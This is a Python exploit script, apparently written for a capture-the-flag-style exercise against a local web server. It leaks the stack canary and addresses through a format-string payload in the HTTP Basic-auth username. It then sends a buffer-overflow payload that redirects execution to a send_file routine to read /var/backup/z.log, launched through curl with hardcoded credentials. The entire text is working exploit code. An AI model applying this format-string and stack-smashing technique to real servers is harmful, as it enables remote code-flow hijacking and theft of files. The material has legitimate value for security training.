import requests
from requests import Session, Request
from pwn import *
import os

# url = "http://127.0.0.1:8000/"
url = "http://localhost:4242/"

response = requests.get(url, auth=('%27$.8x %30$.8x %31$.8x %51$.8x', 'a'))

canary, stack, address, setvbuf = [int(x.replace('"', ''), 16) for x in response.headers['WWW-Authenticate'].split()[-4:]]



canary += 0x3d
stack -= 336 - 93 + 370
sendfile_off = 1625
stack_off = 0xffffcd54 - 0xffffcbe3

filename = stack + stack_off
sendfile = address + sendfile_off

#print("send_file", hex(sendfile))

payload = b" "*500
#if you just want to view the listing of files in the var/backup/backup.log then uncooment the next line and comment the one after that with the different path (line 29)
#payload += b"/var/backup/backup.log="
#z.log contains the answer to the 4th query and the clue for the 5th
payload += b"/var/backup/z.log="
payload += b"A"*(540-len(payload))
payload += struct.pack("I", stack)
payload += b"A"*20
payload += struct.pack("I", stack)
payload += b"A"*4
payload += struct.pack("I", canary)
payload += b"A"*12
payload += struct.pack("I", sendfile) # overide with send_file
payload += b"A"*4
payload += struct.pack("I", filename)# write new dir, points to the next byte

if url == 'http://127.0.0.1:8000/':
    auth = 'Basic YWRtaW46aGVsbG8xMjM='
else:
    auth = 'Basic YWRtaW46Ym9iJ3MgeW91ciB1bmNsZQ=='

f = open("ultimate.payload",'wb')
f.write(payload)
f.close()

req = f''' curl --http0.9 -m 5 --data-binary @./ultimate.payload -H "Content-Length:512" -H "Authorization: {auth}" {url}ultimate.html'''
# input("Press Enter to attack")
print(req)
os.system(req)